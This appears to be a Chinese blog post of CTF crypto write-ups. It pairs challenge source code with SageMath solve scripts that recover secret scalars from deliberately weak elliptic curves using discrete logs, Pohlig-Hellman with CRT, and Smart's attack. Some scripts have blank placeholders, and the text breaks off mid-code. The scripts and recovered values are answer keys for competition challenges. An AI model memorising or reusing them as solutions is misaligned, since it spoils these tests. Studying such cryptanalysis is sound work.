<h2 id="第五空间2021-ecc"><a href="#第五空间2021-ecc" class="headerlink" title="第五空间2021 ecc"></a>第五空间2021 ecc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Try to solve the 3 ECC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">num1 = bytes_to_long(flag[:<span class="number">7</span>])</span><br><span class="line">num2 = bytes_to_long(flag[<span class="number">7</span>:<span class="number">14</span>])</span><br><span class="line">num3 = bytes_to_long(flag[<span class="number">14</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC1</span>(<span class="params">num</span>):</span><br><span class="line">	p = <span class="number">146808027458411567</span></span><br><span class="line">	A = <span class="number">46056180</span></span><br><span class="line">	B = <span class="number">2316783294673</span></span><br><span class="line">	E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">	P = E.random_point() </span><br><span class="line">	Q = num*P</span><br><span class="line">	<span class="built_in">print</span> E</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC2</span>(<span class="params">num</span>):</span><br><span class="line">	p = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">	<span class="comment">#import random</span></span><br><span class="line">	<span class="comment">#A = random.randrange(389718923781273978681723687163812)</span></span><br><span class="line">	<span class="comment">#B = random.randrange(816378675675716537126387613131232121431231)</span></span><br><span class="line">	A = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">	B = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">	E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">	P = E.random_point() </span><br><span class="line">	Q = num*P</span><br><span class="line">	<span class="built_in">print</span> E</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line">	factors, exponents = <span class="built_in">zip</span>(*factor(E.order()))</span><br><span class="line">	primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span> primes</span><br><span class="line">	dlogs = []</span><br><span class="line">	<span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">		t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) / <span class="built_in">int</span>(fac))</span><br><span class="line">		dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">		dlogs += [dlog]</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">	<span class="built_in">print</span> num</span><br><span class="line">	<span class="built_in">print</span> crt(dlogs,primes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC3</span>(<span class="params">num</span>):</span><br><span class="line">	p = <span class="number">0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b</span></span><br><span class="line">	A = <span class="number">0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07</span></span><br><span class="line">	B = <span class="number">0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2</span></span><br><span class="line">	E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">	P = E.random_point() </span><br><span class="line">	Q = num*P</span><br><span class="line">	<span class="built_in">print</span> E</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line"></span><br><span class="line">ECC1(num1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;==============&#x27;</span></span><br><span class="line">ECC2(num2)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;==============&#x27;</span></span><br><span class="line">ECC3(num3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>三层ECC<br>第一部分: 数据都很小直接离散对数求解<br>第二部分: 题目已经帮我们实现了当曲线的阶可以分解时 可以用CRT+DLP来求解<br>第三部分: 曲线的阶和p相等 SmartAttack</p>
<p>第一部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = <span class="number">146808027458411567</span></span><br><span class="line">A1 = <span class="number">46056180</span></span><br><span class="line">B1 = <span class="number">2316783294673</span></span><br><span class="line">E1 = EllipticCurve(GF(p1),[A1,B1])</span><br><span class="line">P1 = E1(<span class="number">119851377153561800</span>,<span class="number">50725039619018388</span>)</span><br><span class="line">Q1 = E1(<span class="number">22306318711744209</span>,<span class="number">111808951703508717</span>)</span><br><span class="line"></span><br><span class="line">num1 = discrete_log(Q1,P1,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"><span class="comment"># num1 = 13566003730592612</span></span><br></pre></td></tr></table></figure>

<p>第二部分<br><a href="http://www.leonlist.top/2020/09/29/CTF%E5%AF%86%E7%A0%81%E5%AD%A6-ECC/" target="_blank">原理</a><br>代码(模板直接套)<br>这里发现好多模板都是对E的阶分解 但是看原理是跟P的阶有关啊 这道题我换成用P的阶完全正确(…) 等多做几道题再来商榷(应该是默认P是E的生成元吧)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p2 = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">A2 = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">B2 = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">E2 = EllipticCurve(GF(p2),[A2,B2])</span><br><span class="line">P2 = E2(<span class="number">550637390822762334900354060650869238926454800955557622817950</span>,<span class="number">700751312208881169841494663466728684704743091638451132521079</span>)</span><br><span class="line">Q2 = E2(<span class="number">1152079922659509908913443110457333432642379532625238229329830</span>,<span class="number">819973744403969324837069647827669815566569448190043645544592</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">num2 = solve(P2,Q2,E2)</span><br><span class="line"><span class="comment"># num2 = 16093767336603949</span></span><br></pre></td></tr></table></figure>

<p>第三部分<br>SmartAttack<br>模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p3 = <span class="number">0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b</span></span><br><span class="line">A3 = <span class="number">0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07</span></span><br><span class="line">B3 = <span class="number">0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2</span></span><br><span class="line">E3 = EllipticCurve(GF(p3),[A3,B3])</span><br><span class="line">P3 = E3(<span class="number">10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861</span> ,<span class="number">8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610</span> )</span><br><span class="line">Q3 = E3(<span class="number">964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927</span> ,<span class="number">5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p3 == E3.order())</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">num3 = SmartAttack(P3,Q3,p3)</span><br><span class="line"><span class="comment"># num3 = 19597596255129283097357413993866074145935170485891892</span></span><br></pre></td></tr></table></figure>

<p>这道题对应的3个part也是ECC很常见的3种攻击方法 要熟练掌握 运用</p>
<h2 id="领航杯江苏省赛2021-ECC"><a href="#领航杯江苏省赛2021-ECC" class="headerlink" title="领航杯江苏省赛2021 ECC"></a>领航杯江苏省赛2021 ECC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;CnHongKe&#123;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">k = bytes_to_long(flag[<span class="number">9</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">assert</span> k &lt; <span class="number">32000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">Zp = Zmod(P)</span><br><span class="line">EC = EllipticCurve(Zp, [a, b])</span><br><span class="line">G = EC(Gx, Gy)</span><br><span class="line">K = k * G</span><br><span class="line"><span class="built_in">print</span> K</span><br><span class="line"></span><br><span class="line"><span class="comment"># (31981799071949968743482831587417174146463993877255771340814476669214408840460 : 15144025062588325012239455117890516531350002058200271280110877844265896081387 : 1)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这种没给额外条件的联想到用CRT+PH来解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">E = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">K = (<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span> , <span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line">K = E(K)</span><br><span class="line">G = E((Gx,Gy))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">num2 = solve(G,K,E)</span><br><span class="line"><span class="built_in">print</span>(num2)</span><br></pre></td></tr></table></figure>
<p>解出来 11000838085296873931177<br>但是发现bit数不够 说明是一个特解 我们枚举一下求flag<br>求得P的阶后利用阶的性质来枚举</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">E = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">K = (<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span> , <span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line">K = E(K)</span><br><span class="line">G = E((Gx,Gy))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    n = prod(primes)</span><br><span class="line">    <span class="keyword">return</span> m,n</span><br><span class="line"></span><br><span class="line">num2,n = solve(G,K,E)</span><br><span class="line">num2 = <span class="number">11000838085296873931177</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">2</span>^<span class="number">21</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    num = num2+k*n</span><br><span class="line">    <span class="keyword">if</span> num*G==K:</span><br><span class="line">        <span class="built_in">print</span>((<span class="built_in">int</span>(num)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 31685206468414518702878516593</span></span><br><span class="line"><span class="comment"># factor_ordeq</span></span><br></pre></td></tr></table></figure>

<h2 id="广东强网杯2021团队组-DLP"><a href="#广东强网杯2021团队组-DLP" class="headerlink" title="广东强网杯2021团队组 DLP"></a>广东强网杯2021团队组 DLP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>] == <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>:] == <span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">d1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">d2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">N1 = <span class="number">27544759469094453505371358768052861416297003882211878831861112512567899543941</span></span><br><span class="line">A1 = <span class="number">4208715803791813173086894172778966025419787767340027559010619240548499823390</span></span><br><span class="line">B1 = <span class="number">11846440123913040489420209031751160809904311707943252241515965930654415480691</span></span><br><span class="line">P1x = <span class="number">479750084250968709343887919962436485997147832319843477221083468203689368148</span></span><br><span class="line">P1y = <span class="number">15452861783577624143044213767588871736433639621547613407582902947429567101675</span></span><br><span class="line"></span><br><span class="line">P1 = (P1x,P1y)</span><br><span class="line">E1 = EllipticCurve(Zmod(N1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">P1 = E1(P1)</span><br><span class="line">Q1 = d1 * P1</span><br><span class="line"></span><br><span class="line">N2 = <span class="number">6471339743593595797696002766822660599108196938080465998531085409467</span></span><br><span class="line">A2 = <span class="number">3199218821393204771660095172457569312269694438403110131957204042314</span></span><br><span class="line">B2 = <span class="number">762889472027318213897694878260359911054972690369935049954326689904</span></span><br><span class="line">P2x = <span class="number">2557373437970770011124755960432555084678930336188254243278984381842</span></span><br><span class="line">P2y = <span class="number">4442763096366920105760404533052204677305995021662082361185473321644</span></span><br><span class="line"></span><br><span class="line">P2 = (P2x,P2y)</span><br><span class="line">E2 = EllipticCurve(Zmod(N2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">P2 = E2(P2)</span><br><span class="line">Q2 = d2 * P2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Q1)</span><br><span class="line"><span class="built_in">print</span>(Q2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(14736970297054248276364510675718632926198693034158620007675880103924809577805 : 3447209262654420855289144268810543114387612255490962015335062266658385100211 : 1)</span></span><br><span class="line"><span class="string">(4834036103940457959470026215023033401071737087504569417466448644066 : 5511016821581393405975510064568222454318072088628361854656950557373 : 1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先贴份exp 有些地方还没弄清楚<br>大致意思是 这里的N都不大 我们可以分解出来 转换成 p,q的求解<br>然后对应 p比较光滑 和 p&#x3D;&#x3D;E.order()的情况 分别用Pohlig-Hellman 和 SmartAttack<br>有个要注意的点是 P1,Q1不是生成元 所以最后CRT组合的时候要用点的阶而不是曲线的阶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">N1 = </span><br><span class="line">A1 = </span><br><span class="line">B1 = </span><br><span class="line">P1x = </span><br><span class="line">P1y = </span><br><span class="line"></span><br><span class="line">Q1x = </span><br><span class="line">Q1y = </span><br><span class="line"></span><br><span class="line">p1 = </span><br><span class="line">q1 = </span><br><span class="line"></span><br><span class="line">P1 = (P1x, P1y)</span><br><span class="line">Q1 = (Q1x, Q1y)</span><br><span class="line">E1p = EllipticCurve(Zmod(p1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">n1p = E1p.order()</span><br><span class="line">P1p = E1p(P1)</span><br><span class="line">Q1p = E1p(Q1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n1p)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line">d1p = P1p.discrete_log(Q1p)</span><br><span class="line"></span><br><span class="line">E1q = EllipticCurve(Zmod(q1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">n1q = E1q.order()</span><br><span class="line">P1q = E1q(P1)</span><br><span class="line">Q1q = E1q(Q1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n1q)</span></span><br><span class="line"><span class="comment"># Smart</span></span><br><span class="line">d1q = SmartAttack(P1q, Q1q, q1)</span><br><span class="line"></span><br><span class="line">d1 = crt([d1p, d1q], [P1p.order(), P1q.order()])</span><br><span class="line"><span class="built_in">print</span>(d1)</span><br><span class="line"></span><br><span class="line">N2 = </span><br><span class="line">A2 = </span><br><span class="line">B2 = </span><br><span class="line">P2x = </span><br><span class="line">P2y = </span><br><span class="line">Q2x = </span><br><span class="line">Q2y = </span><br><span class="line"></span><br><span class="line">p2 = <span class="number">69857405335111415530599248077</span></span><br><span class="line">q2 = <span class="number">92636417177965240871815246762704348071</span></span><br><span class="line"></span><br><span class="line">P2 = (P2x,P2y)</span><br><span class="line">Q2 = (Q2x,Q2y)</span><br><span class="line">E2p = EllipticCurve(Zmod(p2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">n2p = E2p.order()</span><br><span class="line">P2p = E2p(P2)</span><br><span class="line">Q2p = E2p(Q2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n2p)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line"><span class="comment"># d2p = P2p.discrete_log(Q2p)</span></span><br><span class="line"><span class="comment"># 64863796476861801236088764479</span></span><br><span class="line">d2p = <span class="number">64863796476861801236088764479</span></span><br><span class="line"></span><br><span class="line">E2q = EllipticCurve(Zmod(q2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">n2q = E2q.order()</span><br><span class="line">P2q = E2q(P2)</span><br><span class="line">Q2q = E2q(Q2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n2q)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line">d2q = P2q.discrete_log(Q2q)</span><br><span class="line"></span><br><span class="line">d2 = crt([d2p, d2q], [P2p.order(), P2q.order()])</span><br><span class="line"><span class="built_in">print</span>(d2)</span><br></pre></td></tr></table></figure>

<h2 id="nctf2022-superecc"><a href="#nctf2022-superecc" class="headerlink" title="nctf2022 superecc"></a>nctf2022 superecc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> INF, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;nctf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"></span><br><span 